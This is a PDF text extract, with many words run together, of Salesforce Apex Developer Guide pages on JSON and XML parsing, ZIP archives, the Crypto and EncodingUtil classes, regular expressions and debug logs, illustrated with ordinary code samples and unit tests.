This example parses a JSON-formatted response using JSONParser methods. It makes a callout to a web service that returns a
response in JSON format. Next, the response is parsed to build up a map from api version numbers to the release labels.
publicclassJSONParserUtil{
publicstaticvoidparseJSONResponse(){
// CreateHTTPrequestto send.
HttpRequestrequest= new HttpRequest();
// Set the endpointURL.
Stringendpoint= URL.getOrgDomainUrl().toExternalForm()+ '/services/data';
request.setEndPoint(endpoint);
// Set the HTTPverbto GET.
647
Integration and Apex UtilitiesApex Developer Guide

request.setMethod('GET');
// Set the requestheaderfor JSONcontenttype
request.setHeader('Accept', 'application/json');
// Sendthe HTTPrequestand get the response.
// The responseis in JSONformat.
HttphttpProtocol= new Http();
HttpResponseresponse= httpProtocol.send(request);
System.debug(response.getBody());
/* The JSONresponsereturnedis the following:
{"label":"Summer'14","url":"/services/data/v31.0","version":"31.0"},
{"label":"Winter'15","url":"/services/data/v32.0","version":"32.0"},
{"label":"Spring'15","url":"/services/data/v33.0","version":"33.0"},
*/
// ParseJSONresponseto builda map fromAPI versionnumbersto labels
JSONParserparser= JSON.createParser(response.getBody());
Map<double,string>apiVersionToReleaseNameMap= new Map<double,string>();
stringlabel= null;
doubleversion= null;
while(parser.nextToken()!= null) {
if (parser.getCurrentToken()== JSONToken.FIELD_NAME){
switchon parser.getText(){
when'label'{
// Advanceto the labelvalue.
parser.nextToken();
label= parser.getText();
}
when'version'{
// Advanceto the versionvalue.
parser.nextToken();
version= Double.valueOf(parser.getText());
}
}
}
if(version!= null&& String.isNotEmpty(label)){
apiVersionToReleaseNameMap.put(version,label);
version= null;
label= null;
}
}
system.debug('ReleasewithRainbowlogo= ' +
apiVersionToReleaseNameMap.get(39.0D));
}
}
Example: Parse a JSON String and Deserialize It into Objects
This example uses a hardcoded JSON string, which is the same JSON string returned by the callout in the previous example. In this
example, the entire string is parsed into Invoice objects using the readValueAs method. This code also uses the skipChildren
method to skip the child array and child objects and parse the next sibling invoice in the list. The parsed objects are instances of the
648
Integration and Apex UtilitiesApex Developer Guide

Invoice class that is defined as an inner class. Because each invoice contains line items, the class that represents the corresponding
line item type, the LineItem class, is also defined as an inner class. Add this sample code to a class to use it.
publicstaticvoidparseJSONString(){
StringjsonStr=
'{"invoiceList":['+
'{"totalPrice":5.5,"statementDate":"2011-10-04T16:58:54.858Z","lineItems":['+
'{"UnitPrice":1.0,"Quantity":5.0,"ProductName":"Pencil"},'+
'{"UnitPrice":0.5,"Quantity":1.0,"ProductName":"Eraser"}],'+
'"invoiceNumber":1},'+
'{"totalPrice":11.5,"statementDate":"2011-10-04T16:58:54.858Z","lineItems":['+
'{"UnitPrice":6.0,"Quantity":1.0,"ProductName":"Notebook"},'+
'{"UnitPrice":2.5,"Quantity":1.0,"ProductName":"Ruler"},'+
'{"UnitPrice":1.5,"Quantity":2.0,"ProductName":"Pen"}],"invoiceNumber":2}'+
']}';
// ParseentireJSONresponse.
JSONParserparser= JSON.createParser(jsonStr);
while(parser.nextToken()!= null) {
// Startat the arrayof invoices.
if (parser.getCurrentToken()== JSONToken.START_ARRAY){
while(parser.nextToken()!= null) {
// Advanceto the startobjectmarkerto
//  findnextinvoicestatementobject.
if (parser.getCurrentToken()== JSONToken.START_OBJECT){
// Readentireinvoiceobject,includingits arrayof lineitems.
Invoiceinv = (Invoice)parser.readValueAs(Invoice.class);
system.debug('Invoicenumber:' + inv.invoiceNumber);
system.debug('Sizeof listitems:' + inv.lineItems.size());
// For debuggingpurposes,serializeagainto verifywhatwas parsed.
Strings = JSON.serialize(inv);
system.debug('Serializedinvoice:' + s);
// Skipthe childstartarrayand startobjectmarkers.
parser.skipChildren();
}
}
}
}
}
// Innerclassesusedfor serializationby readValuesAs().
publicclassInvoice{
publicDoubletotalPrice;
publicDateTimestatementDate;
publicLonginvoiceNumber;
List<LineItem>lineItems;
publicInvoice(Doubleprice,DateTimedt, LonginvNumber,List<LineItem>liList){
totalPrice= price;
statementDate= dt;
invoiceNumber= invNumber;
lineItems= liList.clone();
649
Integration and Apex UtilitiesApex Developer Guide

}
}
publicclassLineItem{
publicDoubleunitPrice;
publicDoublequantity;
publicStringproductName;
}
SEE ALSO:
Apex Reference Guide: JSONParser Class
XML Support
Apex provides utility classes that enable the creation and parsing of XML content using streams and the DOM.
This section contains details about XML support.
Reading and Writing XML Using Streams
Apex provides classes for reading and writing XML content using streams.
Reading and Writing XML Using the DOM
Apex provides classes that enable you to work with XML content using the DOM (Document Object Model).
Reading and Writing XML Using Streams
Apex provides classes for reading and writing XML content using streams.
The XMLStreamReader class enables you to read XML content and the XMLStreamWriter class enables you to write XML content.
Reading XML Using Streams
The XMLStreamReader class methods enable forward, read-only access to XML data.
Writing XML Using Streams
The XmlStreamWriter class methods enable the writing of XML data.
Reading XML Using Streams
The XMLStreamReader class methods enable forward, read-only access to XML data.
Those methods are used in conjunction with HTTP callouts to parse XML data or skip unwanted events. You can parse nested XML
content that’s up to 50 nodes deep. The following example shows how to instantiate a new XmlStreamReader object:
StringxmlString= '<books><book>MyBook</book><book>YourBook</book></books>';
XmlStreamReaderxsr = new XmlStreamReader(xmlString);
These methods work on the following XML events:
•
An attribute event is specified for a particular element. For example, the element <book> has an attribute title: <book
title="Salesforce.comfor Dummies">.
•
A start element event is the opening tag for an element, for example <book>.
•
An end element event is the closing tag for an element, for example </book>.
650
Integration and Apex UtilitiesApex Developer Guide

•
A start document event is the opening tag for a document.
•
An end document event is the closing tag for a document.
•
An entity reference is an entity reference in the code, for example !ENTITYtitle= "My BookTitle".
•
A characters event is a text character.
•
A comment event is a comment in the XML file.
Use the next and hasNext methods to iterate over XML data. Access data in XML using get methods such as the getNamespace
method.
When iterating over the XML data, always check that stream data is available using hasNext before calling next to avoid attempting
to read past the end of the XML data.
XmlStreamReader Example
The following example processes an XML string.
publicclassXmlStreamReaderDemo{
// Createa classBookfor processing
publicclassBook{
Stringname;
Stringauthor;
}
publicBook[]parseBooks(XmlStreamReaderreader){
Book[]books= new Book[0];
booleanisSafeToGetNextXmlElement= true;
while(isSafeToGetNextXmlElement){
// Startat the beginningof the bookand makesurethatit is a book
if (reader.getEventType()== XmlTag.START_ELEMENT){
if ('Book'== reader.getLocalName()){
// Passthe bookto the parseBookmethod(below)
Bookbook= parseBook(reader);
books.add(book);
}
}
// Alwaysuse hasNext()beforecallingnext()to confirm
// thatwe havenot reachedthe end of the stream
if (reader.hasNext()){
reader.next();
} else{
isSafeToGetNextXmlElement= false;
break;
}
}
returnbooks;
}
// Parsethroughthe XML,determinethe authorand the characters
BookparseBook(XmlStreamReaderreader){
Bookbook= new Book();
book.author= reader.getAttributeValue(null, 'author');
booleanisSafeToGetNextXmlElement= true;
while(isSafeToGetNextXmlElement){
651
Integration and Apex UtilitiesApex Developer Guide

if (reader.getEventType()== XmlTag.END_ELEMENT){
break;
} elseif (reader.getEventType()== XmlTag.CHARACTERS){
book.name= reader.getText();
}
// Alwaysuse hasNext()beforecallingnext()to confirm
// thatwe havenot reachedthe end of the stream
if (reader.hasNext()){
reader.next();
} else{
isSafeToGetNextXmlElement= false;
break;
}
}
returnbook;
}
}
@isTest
privateclassXmlStreamReaderDemoTest{
// Testthatthe XML stringcontainsspecificvalues
statictestMethodvoidtestBookParser(){
XmlStreamReaderDemodemo= new XmlStreamReaderDemo();
Stringstr = '<books><bookauthor="Chatty">Alphabeta</book>'+
'<bookauthor="Sassy">Baz</book></books>';
XmlStreamReaderreader= new XmlStreamReader(str);
XmlStreamReaderDemo.Book[]books= demo.parseBooks(reader);
System.debug(books.size());
for (XmlStreamReaderDemo.Bookbook: books){
System.debug(book);
}
}
}
SEE ALSO:
Apex Reference Guide: XmlStreamReader Class
Writing XML Using Streams
The XmlStreamWriter class methods enable the writing of XML data.
Those methods are used in conjunction with HTTP callouts to construct an XML document to send in the callout request to an external
service. The following example shows how to instantiate a new XmlStreamReader object:
StringxmlString= '<books><book>MyBook</book><book>YourBook</book></books>';
XmlStreamReaderxsr = new XmlStreamReader(xmlString);
652
Integration and Apex UtilitiesApex Developer Guide

XML Writer Methods Example
The following example writes an XML document and tests its validity.
This Hello World sample requires custom objects. You can either create these objects on your own, or download the objects and Apex
code as an unmanaged package from AppExchange. To obtain the sample assets in your org, install the Apex Tutorials Package. This
package also contains sample code and objects for the Shipping Invoice example.
publicclassXmlWriterDemo{
publicStringgetXml(){
XmlStreamWriterw = new XmlStreamWriter();
w.writeStartDocument(null, '1.0');
w.writeProcessingInstruction('target', 'data');
w.writeStartElement('m', 'Library', 'http://www.book.com');
w.writeNamespace('m', 'http://www.book.com');
w.writeComment('Bookstartshere');
w.setDefaultNamespace('http://www.defns.com');
w.writeCData('<Cdata>I likeCData</Cdata>');
w.writeStartElement(null, 'book', null);
w.writedefaultNamespace('http://www.defns.com');
w.writeAttribute(null, null, 'author', 'Manoj');
w.writeCharacters('Thisis my book');
w.writeEndElement();//endbook
w.writeEmptyElement(null, 'ISBN', null);
w.writeEndElement();//endlibrary
w.writeEndDocument();
StringxmlOutput= w.getXmlString();
w.close();
returnxmlOutput;
}
}
@isTest
privateclassXmlWriterDemoTest{
staticTestMethodvoidbasicTest(){
XmlWriterDemodemo= new XmlWriterDemo();
Stringresult= demo.getXml();
Stringexpected= '<?xmlversion="1.0"?><?targetdata?>'+
'<m:Libraryxmlns:m="http://www.book.com">'+
'<!--Bookstartshere-->'+
'<![CDATA[<Cdata>I likeCData</Cdata>]]>'+
'<bookxmlns="http://www.defns.com"author="Manoj">Thisis my
book</book><ISBN/></m:Library>';
System.assert(result== expected);
}
}
SEE ALSO:
Apex Reference Guide: XmlStreamWriter Class
653
Integration and Apex UtilitiesApex Developer Guide

Reading and Writing XML Using the DOM
Apex provides classes that enable you to work with XML content using the DOM (Document Object Model).
DOM classes help you parse or generate XML content. You can use these classes to work with any XML content. One common application
is to use the classes to generate the body of a request created by HttpRequest or to parse a response accessed by HttpResponse. The
DOM represents an XML document as a hierarchy of nodes. Some nodes may be branch nodes and have child nodes, while others are
leaf nodes with no children. You can parse nested XML content that’s up to 50 nodes deep.
The DOM classes are contained in the Dom namespace.
Use the Document Class to process the content in the body of the XML document.
Use the XmlNode Class to work with a node in the XML document.
Use the Document Class class to process XML content. One common application is to use it to create the body of a request for HttpRequest
or to parse a response accessed by HttpResponse.
XML Namespaces
An XML namespace is a collection of names identified by a URI reference and used in XML documents to uniquely identify element types
and attribute names. Names in XML namespaces may appear as qualified names, which contain a single colon, separating the name
into a namespace prefix and a local part. The prefix, which is mapped to a URI reference, selects a namespace. The combination of the
universally managed URI namespace and the document's own namespace produces identifiers that are universally unique.
The following XML element has a namespace of http://my.name.space and a prefix of myprefix.
<sampleElementxmlns:myprefix="http://my.name.space"/>
In the following example, the XML element has two attributes:
•
The first attribute has a key of dimension; the value is 2.
•
The second attribute has a key namespace of http://ns1; the value namespace is http://ns2; the key is example; the
value is test.
<squaredimension="2" ns1:example="ns2:test"xmlns:ns1="http://ns1"xmlns:ns2="http://ns2"
/>
Document Example
For the purposes of the sample below, assume that the url argument passed into the parseResponseDom method returns this
XML response:
<address>
<name>KirkStevens</name>
<street1>808StateSt</street1>
<street2>Apt.2</street2>
<city>Palookaville</city>
<state>PA</state>
<country>USA</country>
</address>
The following example illustrates how to use DOM classes to parse the XML response returned in the body of a GET request:
publicclassDomDocument{
// Passin the URL for the request
// For the purposesof thissample,assumethatthe URL
654
Integration and Apex UtilitiesApex Developer Guide

// returnsthe XML shownabovein the responsebody
publicvoidparseResponseDom(Stringurl){
Httph = new Http();
HttpRequestreq = new HttpRequest();
// url thatreturnsthe XML in the responsebody
req.setEndpoint(url);
req.setMethod('GET');
HttpResponseres = h.send(req);
Dom.Documentdoc = res.getBodyDocument();
//Retrievethe rootelementfor thisdocument.
Dom.XMLNodeaddress= doc.getRootElement();
Stringname= address.getChildElement('name', null).getText();
Stringstate= address.getChildElement('state', null).getText();
// printout specificelements
System.debug('Name:' + name);
System.debug('State:' + state);
// Alternatively,loopthroughthe childelements.
// Thisprintsout all the elementsof the address
for(Dom.XMLNodechild: address.getChildElements()){
System.debug(child.getText());
}
}
}
Using XML Nodes
Use the XmlNode class to work with a node in an XML document. The DOM represents an XML document as a hierarchy of nodes.
Some nodes may be branch nodes and have child nodes, while others are leaf nodes with no children.
There are different types of DOM nodes available in Apex. XmlNodeType is an enum of these different types. The values are:
•
COMMENT
•
ELEMENT
•
TEXT
It is important to distinguish between elements and nodes in an XML document. The following is a simple XML example:
<name>
<firstName>Suvain</firstName>
<lastName>Singh</lastName>
</name>
This example contains three XML elements: name, firstName, and lastName. It contains five nodes: the three name, firstName,
and lastName element nodes, as well as two text nodes—Suvain and Singh. Note that the text within an element node is
considered to be a separate text node.
For more information about the methods shared by all enums, see Enum Methods.
655
Integration and Apex UtilitiesApex Developer Guide

XmlNode Example
This example shows how to use XmlNode methods and namespaces to create an XML request.
publicclassDomNamespaceSample
{
publicvoidsendRequest(Stringendpoint)
{
// Createthe requestenvelope
DOM.Documentdoc = new DOM.Document();
StringsoapNS= 'http://schemas.xmlsoap.org/soap/envelope/';
Stringxsi = 'http://www.w3.org/2001/XMLSchema-instance';
StringserviceNS= 'http://www.myservice.com/services/MyService/';
dom.XmlNodeenvelope
= doc.createRootElement('Envelope', soapNS,'soapenv');
envelope.setNamespace('xsi', xsi);
envelope.setAttributeNS('schemaLocation', soapNS,xsi,null);
dom.XmlNodebody
= envelope.addChildElement('Body', soapNS,null);
body.addChildElement('echo', serviceNS,'req').
addChildElement('category', serviceNS,null).
addTextNode('classifieds');
System.debug(doc.toXmlString());
// Sendthe request
HttpRequestreq = new HttpRequest();
req.setMethod('POST');
req.setEndpoint(endpoint);
req.setHeader('Content-Type', 'text/xml');
req.setBodyDocument(doc);
Httphttp= new Http();
HttpResponseres = http.send(req);
System.assertEquals(200,res.getStatusCode());
dom.DocumentresDoc= res.getBodyDocument();
envelope= resDoc.getRootElement();
Stringwsa = 'http://schemas.xmlsoap.org/ws/2004/08/addressing';
dom.XmlNodeheader= envelope.getChildElement('Header', soapNS);
System.assert(header!= null);
StringmessageId
= header.getChildElement('MessageID', wsa).getText();
System.debug(messageId);
656
Integration and Apex UtilitiesApex Developer Guide

System.debug(resDoc.toXmlString());
System.debug(resDoc);
System.debug(header);
System.assertEquals(
'http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous',
header.getChildElement(
'ReplyTo', wsa).getChildElement('Address', wsa).getText());
System.assertEquals(
envelope.getChildElement('Body', soapNS).
getChildElement('echo', serviceNS).
getChildElement('something', 'http://something.else').
getChildElement(
'whatever', serviceNS).getAttribute('bb', null),
'cc');
System.assertEquals('classifieds',
envelope.getChildElement('Body', soapNS).
getChildElement('echo', serviceNS).
getChildElement('category', serviceNS).getText());
}
}
SEE ALSO:
Apex Reference Guide: Document Class
ZIP Support
Take advantage of a native Apex Zip library to create and extract ZIP archive files by using the class methods in the Compression
namespace.
You can compress multiple attachments or documents into an Apex blob that contains the ZIP archive. You can also specify the data to
be extracted from the zip archive, without uncompressing the entire ZIP archive. To optimize compression, you can specify a compression
method and compression level.
This example code extracts a JSON translation file from a callout response containing a ZIP archive by getting and extracting the specified
entry from the ZIP archive.
HttpRequestrequest= new HttpRequest();
request.setEndpoint('callout:My_Named_Credential/translationService');
request.setMethod('POST');
// Set requestpayloadto translate...
HttpResponseresponse= new Http().send(request);
BlobtranslationZip= response.getBodyAsBlob();
ZipReaderreader= new ZipReader(translationZip);
657
Integration and Apex UtilitiesApex Developer Guide

ZipEntryfrTranslation= reader.getEntry('translations/fr.json');
BlobfrTranslationData= reader.extractEntry(frTranslation);
SEE ALSO:
Apex Reference Guide: Compression NameSpace
Securing Your Data
You can secure your data by using the methods provided by the Crypto class.
The methods in the Crypto class provide standard algorithms for creating digests, message authentication codes, and signatures, as
well as encrypting and decrypting information. These alogorithms can be used for securing content in Salesforce or for integrating with
external services such as Google or Amazon WebServices (AWS).
Note:  The code excerpts on this page are written to highlight the use of the Crypto class. A production-level implementation
would incorporate more plaintext key security. Refer to Strengthen Your Data’s Security with Shield Platform Encryption in Salesforce
Help.
Example Integrating Amazon WebServices
This example demonstrates an integration of Amazon WebServices with Salesforce.
publicclassHMacAuthCallout{
publicvoidtestAlexaWSForAmazon(){
// The dateformatis yyyy-MM-dd'T'HH:mm:ss.SSS'Z'
DateTimed = System.now();
Stringtimestamp= ''+ d.year()+ '-' +
d.month()+ '-' +
d.day()+ '\'T\''+
d.hour()+ ':' +
d.minute()+ ':' +
d.second()+ '.' +
d.millisecond()+ '\'Z\'';
StringtimeFormat= d.formatGmt(timestamp);
StringurlEncodedTimestamp= EncodingUtil.urlEncode(timestamp,'UTF-8');
Stringaction= 'UrlInfo';
StringinputStr= action+ timeFormat;
StringalgorithmName= 'HMacSHA1';
Blobmac = Crypto.generateMac(algorithmName,Blob.valueOf(inputStr),
Blob.valueOf('your_signing_key'));
StringmacUrl= EncodingUtil.urlEncode(EncodingUtil.base64Encode(mac),'UTF-8');
StringurlToTest= 'amazon.com';
Stringversion= '2005-07-11';
Stringendpoint= 'http://awis.amazonaws.com/';
StringaccessKey= 'your_key';
HttpRequestreq = new HttpRequest();
req.setEndpoint(endpoint+
'?AWSAccessKeyId='+ accessKey+
658
Integration and Apex UtilitiesApex Developer Guide

'&Action='+ action+
'&ResponseGroup=Rank&Version='+ version+
'&Timestamp='+ urlEncodedTimestamp+
'&Url='+ urlToTest+
'&Signature='+ macUrl);
req.setMethod('GET');
Httphttp= new Http();
try {
HttpResponseres = http.send(req);
System.debug('STATUS:'+res.getStatus());
System.debug('STATUS_CODE:'+res.getStatusCode());
System.debug('BODY:'+res.getBody());
} catch(System.CalloutExceptione) {
System.debug('ERROR:'+ e);
}
}
}
Example Encrypting and Decrypting
This example uses the encryptWithManagedIV and decryptWithManagedIV methods and the generateAesKey
method of the Crypto class.
// Use generateAesKeyto generatethe privatekey
BlobcryptoKey= Crypto.generateAesKey(256);
// Generatethe datato be encrypted.
Blobdata= Blob.valueOf('Testdatato encrypted');
// Encryptthe dataand haveSalesforcegeneratethe initializationvector
BlobencryptedData= Crypto.encryptWithManagedIV('AES256', cryptoKey,data);
// Decryptthe data
BlobdecryptedData= Crypto.decryptWithManagedIV('AES256', cryptoKey,encryptedData);
This example shows how to write a unit test for the encryptWithManagedIV and decryptWithManagedIV Crypto methods.
@isTest
privateclassCryptoTest{
statictestMethodvoidtestValidDecryption(){
// Use generateAesKeyto generatethe privatekey
Blobkey = Crypto.generateAesKey(128);
// Generatethe datato be encrypted.
Blobdata= Blob.valueOf('Testdata');
// Generatean encryptedformof the datausingbase64encoding
Stringb64Data= EncodingUtil.base64Encode(data);
// Encryptand decryptthe data
BlobencryptedData= Crypto.encryptWithManagedIV('AES128', key,data);
BlobdecryptedData= Crypto.decryptWithManagedIV('AES128', key,encryptedData);
Stringb64Decrypted= EncodingUtil.base64Encode(decryptedData);
// Verifythatthe stringsstillmatch
System.assertEquals(b64Data,b64Decrypted);
659
Integration and Apex UtilitiesApex Developer Guide

}
statictestMethodvoidtestInvalidDecryption(){
// Verifythatyou mustuse the samekey sizefor encryptingdata
// Generatetwo privatekeys,usingdifferentkey sizes
BlobkeyOne= Crypto.generateAesKey(128);
BlobkeyTwo= Crypto.generateAesKey(256);
// Generatethe datato be encrypted.
Blobdata= Blob.valueOf('Testdata');
// Encryptthe datausingthe firstkey
BlobencryptedData= Crypto.encryptWithManagedIV('AES128', keyOne,data);
try {
// Try decryptingthe datausingthe secondkey
Crypto.decryptWithManagedIV('AES256', keyTwo,encryptedData);
System.assert(false);
} catch(SecurityExceptione) {
System.assertEquals('Givenfinalblocknot properlypadded', e.getMessage());
}
}
}
SEE ALSO:
Apex Reference Guide: Crypto Class
Salesforce Help: Strengthen Your Data’s Security with Shield Platform Encryption
Apex Reference Guide: EncodingUtil Class
Encoding Your Data
You can encode and decode URLs and convert strings to hexadecimal format by using the methods provided by the EncodingUtil
class.
This example shows how to URL encode a timestamp value in UTF-8 by calling urlEncode.
DateTimed = System.now();
Stringtimestamp= ''+ d.year()+ '-' +
d.month()+ '-' +
d.day()+ '\'T\''+
d.hour()+ ':' +
d.minute()+ ':' +
d.second()+ '.' +
d.millisecond()+ '\'Z\'';
System.debug(timestamp);
StringurlEncodedTimestamp= EncodingUtil.urlEncode(timestamp,'UTF-8');
System.debug(urlEncodedTimestamp);
This next example shows how to use convertToHex to compute a client response for HTTP Digest Authentication (RFC2617).
@isTest
privateclassSampleTest{
statictestmethodvoidtestConvertToHex(){
StringmyData= 'A TestString';
Blobhash= Crypto.generateDigest('SHA1',Blob.valueOf(myData));
StringhexDigest= EncodingUtil.convertToHex(hash);
660
Integration and Apex UtilitiesApex Developer Guide

System.debug(hexDigest);
}
}
SEE ALSO:
Apex Reference Guide: EncodingUtil Class
Using Patterns and Matchers
Apex provides patterns and matchers that enable you to search text using regular expressions.
A pattern is a compiled representation of a regular expression. Patterns are used by matchers to perform match operations on a character
string.
A regular expression is a string that is used to match another string, using a specific syntax. Apex supports the use of regular expressions
through its Pattern and Matcher classes.
Note:  In Apex, Patterns and Matchers, as well as regular expressions, are based on their counterparts in Java. See
http://java.sun.com/j2se/1.5.0/docs/api/index.html?java/util/regex/Pattern.html.
Many Matcher objects can share the same Pattern object, as shown in the following illustration:
Many Matcher objects can be created from the same Pattern object
Regular expressions in Apex follow the standard syntax for regular expressions used in Java. Any Java-based regular expression strings
can be easily imported into your Apex code.
Note:  Salesforce limits the number of times an input sequence for a regular expression can be accessed to 1,000,000 times. If you
reach that limit, you receive a runtime error.
All regular expressions are specified as strings. Most regular expressions are first compiled into a Pattern object: only the String split
method takes a regular expression that isn't compiled.
Generally, after you compile a regular expression into a Pattern object, you only use the Pattern object once to create a Matcher object.
All further actions are then performed using the Matcher object. For example:
// First,instantiatea new Patternobject"MyPattern"
PatternMyPattern= Pattern.compile('a*b');
661
Integration and Apex UtilitiesApex Developer Guide

// Theninstantiatea new Matcherobject"MyMatcher"
MatcherMyMatcher= MyPattern.matcher('aaaaab');
// You can use the systemstaticmethodassertto verifythe match
System.assert(MyMatcher.matches());
If you are only going to use a regular expression once, use the Pattern class matches method to compile the expression and
match a string against it in a single invocation. For example, the following is equivalent to the code above:
BooleanTest= Pattern.matches('a*b', 'aaaaab');
Using Regions
Using Match Operations
Using Bounds
Understanding Capturing Groups
Pattern and Matcher Example
Using Regions
A Matcher object finds matches in a subset of its input string called a region. The default region for a Matcher object is always the entirety
of the input string. However, you can change the start and end points of a region by using the region method, and you can query
the region's end points by using the regionStart and regionEnd methods.
The region method requires both a start and an end value. The following table provides examples of how to set one value without
setting the other.
Code ExampleEnd of the RegionStart of the Region
MyMatcher.region(start,MyMatcher.regionEnd());
Leave unchangedSpecify explicitly
MyMatcher.region(MyMatcher.regionStart(),end);
Specify explicitlyLeave unchanged
MyMatcher.region(0,end);
Specify explicitlyReset to the default
Using Match Operations
A Matcher object performs match operations on a character sequence by interpreting a Pattern.
A Matcher object is instantiated from a Pattern by the Pattern's matcher method. Once created, a Matcher object can be used to
perform the following types of match operations:
•
Match the Matcher object's entire input string against the pattern using the matches method
•
Match the Matcher object's input string against the pattern, starting at the beginning but without matching the entire region, using
the lookingAt method
•
Scan the Matcher object's input string for the next substring that matches the pattern using the find method
Each of these methods returns a Boolean indicating success or failure.
662
Integration and Apex UtilitiesApex Developer Guide

After you use any of these methods, you can find out more information about the previous match, that is, what was found, by using the
following Matcher class methods:
•
end: Once a match is made, this method returns the position in the match string after the last character that was matched.
•
start: Once a match is made, this method returns the position in the string of the first character that was matched.
•
group: Once a match is made, this method returns the subsequence that was matched.
Using Bounds
By default, a region is delimited by anchoring bounds, which means that the line anchors (such as ^ or $) match at the region boundaries,
even if the region boundaries have been moved from the start and end of the input string. You can specify whether a region uses
anchoring bounds with the useAnchoringBounds method. By default, a region always uses anchoring bounds. If you set
useAnchoringBounds to false, the line anchors match only the true ends of the input string.
By default, all text located outside of a region is not searched, that is, the region has opaque bounds. However, using transparent bounds
it is possible to search the text outside of a region. Transparent bounds are only used when a region no longer contains the entire input
string. You can specify which type of bounds a region has by using the useTransparentBounds method.
Suppose you were searching the following string, and your region was only the word “STRING”:
Thisis a concatenatedSTRINGof catsand dogs.
If you searched for the word “cat”, you wouldn't receive a match unless you had transparent bounds set.
Understanding Capturing Groups
During a matching operation, each substring of the input string that matches the pattern is saved. These matching substrings are called
capturing groups.
Capturing groups are numbered by counting their opening parentheses from left to right. For example, in the regular expression string
((A)(B(C))), there are four capturing groups:
1.((A)(B(C)))
2.(A)
3.(B(C))
4.(C)
Group zero always stands for the entire expression.
The captured input associated with a group is always the substring of the group most recently matched, that is, that was returned by
one of the Matcher class match operations.
If a group is evaluated a second time using one of the match operations, its previously captured value, if any, is retained if the second
evaluation fails.
Pattern and Matcher Example
The Matcher class end method returns the position in the match string after the last character that was matched. You would use this
when you are parsing a string and want to do additional work with it after you have found a match, such as find the next match.
In regular expression syntax, ? means match once or not at all, and + means match 1 or more times.
663
Integration and Apex UtilitiesApex Developer Guide

In the following example, the string passed in with the Matcher object matches the pattern since (a(b)?) matches the string 'ab'
- 'a' followed by 'b' once. It then matches the last 'a' - 'a' followed by 'b' not at all.
patternmyPattern= pattern.compile('(a(b)?)+');
matchermyMatcher= myPattern.matcher('aba');
System.assert(myMatcher.matches()&& myMatcher.hitEnd());
// We havetwo groups:group0 is alwaysthe wholepattern,and group1 contains
// the substringthatmostrecentlymatched--inthiscase,'a'.
// So the followingis true:
System.assert(myMatcher.groupCount()== 2 &&
myMatcher.group(0)== 'aba'&&
myMatcher.group(1)== 'a');
// Sincegroup0 refersto the wholepattern,the followingis true:
System.assert(myMatcher.end()== myMatcher.end(0));
// Sincethe offsetafterthe lastcharactermatchedis returnedby end,
// and sincebothgroupsusedthe lastinputletter,thatoffsetis 3
// Rememberthe offsetstartsits countat 0. So the followingis alsotrue:
System.assert(myMatcher.end()== 3 &&
myMatcher.end(0)== 3 &&
myMatcher.end(1)== 3);
In the following example, email addresses are normalized and duplicates are reported if there is a different top-level domain name or
subdomain for similar email addresses. For example, john@fairway.smithco is normalized to john@smithco.
classnormalizeEmailAddresses{
publicvoidhasDuplicatesByDomain(Lead[]leads){
// Thispatternreducesthe emailaddressto 'john@smithco'
// from'john@*.smithco.com'or 'john@smithco.*'
PatternemailPattern= Pattern.compile('(?<=@)((?![\\w]+\\.[\\w]+$)
[\\w]+\\.)|(\\.[\\w]+$)');
// Definea set for emailkeyto lead:
Map<String,Lead>leadMap= new Map<String,Lead>();
for(Leadlead:leads){
// Ignoreleadswitha nullemail
if(lead.Email!= null) {
// Generatethe key usingthe regularexpression
StringemailKey= emailPattern.matcher(lead.Email).replaceAll('');
// Lookfor duplicatesin the batch
if(leadMap.containsKey(emailKey))
lead.email.addError('Duplicatefoundin batch');
else{
// Keepthe key in the duplicatekey customfield
lead.Duplicate_Key__c= emailKey;
leadMap.put(emailKey,lead);
}
}
}
664
Integration and Apex UtilitiesApex Developer Guide

// Now searchthe databaselookingfor duplicates
for(Lead[]leadsCheck:[SELECTId, duplicate_key__cFROMLeadWHERE
duplicate_key__cIN :leadMap.keySet()]){
for(Leadlead:leadsCheck){
// If there'sa duplicate,add the error.
if(leadMap.containsKey(lead.Duplicate_Key__c))
leadMap.get(lead.Duplicate_Key__c).email.addError('Duplicatefound
in salesforce(Id:' + lead.Id+ ')');
}
}
}
}
SEE ALSO:
Apex Reference Guide: Pattern Class
Apex Reference Guide: Matcher Class
Debugging, Testing, and Deploying Apex
Develop your Apex code in a sandbox and debug it with the Developer Console and debug logs. Unit-test your code, then distribute it
to customers using packages.
Debugging Apex
Apex provides debugging support. You can debug your Apex code using the Developer Console and debug logs.
Testing Apex
Apex provides a testing framework that allows you to write unit tests, run your tests, check test results, and have code coverage
results.
Deploying Apex
You can't develop Apex in your Salesforce production org. Your development work is done in a sandbox, in a scratch org, or in a
Developer Edition org.
Distributing Apex Using Managed Packages
As an ISV or Salesforce partner, you can distribute Apex code to customer organizations using packages. Here we'll describe packages
and package versioning.
Debugging Apex
Apex provides debugging support. You can debug your Apex code using the Developer Console and debug logs.
To aid debugging in your code, Apex supports exception statements and custom exceptions. Also, Apex sends emails to developers for
unhandled exceptions.
1.Debug Log
2.Exceptions in Apex
Exceptions note errors and other events that disrupt the normal flow of code execution. throw statements are used to generate
exceptions, while try, catch, and finally statements are used to gracefully recover from exceptions.
665
Debugging, Testing, and Deploying ApexApex Developer Guide

Debug Log
A debug log can record database operations, system processes, and errors that occur when executing a transaction or running unit tests.
Debug logs can contain information about:
•
Database changes
•
HTTP callouts
•
Apex errors
•
Resources used by Apex
•
Automated workflow processes, such as:
–
Workflow rules
–
Assignment rules
–
Approval processes
–
Validation rules
Note:  The debug log doesn’t include information from actions triggered by time-based workflows. It also doesn’t include
information from standard or custom controllers used in Visualforce email templates.
You can retain and manage debug logs for specific users, including yourself, and for classes and triggers. Setting class and trigger trace
flags doesn’t cause logs to be generated or saved. Class and trigger trace flags override other logging levels, including logging levels set
by user trace flags, but they don’t cause logging to occur. If logging is enabled when classes or triggers execute, logs are generated at
the time of execution.
To view a debug log from Setup, enter DebugLogs in the QuickFind box, then select Debug Logs. Then click View next to
the debug log that you want to examine. Click Download to download the debug log as a log file.
Debug Log Limits
Debug logs have the following limits.
•
Each debug log must be 20 MB or smaller. Debug logs that are larger than 20 MB are reduced in size by removing older log lines,
such as log lines for earlier System.debug statements. The log lines can be removed from any location, not just the start of the
debug log.
•
System debug logs are retained for 24 hours. Monitoring debug logs are retained for seven days.
•
If you generate more than 1,000 MB of debug logs in a 15-minute window, your trace flags are disabled. We send an email to the
users who last modified the trace flags, informing them that they can re-enable the trace flag in 15 minutes.
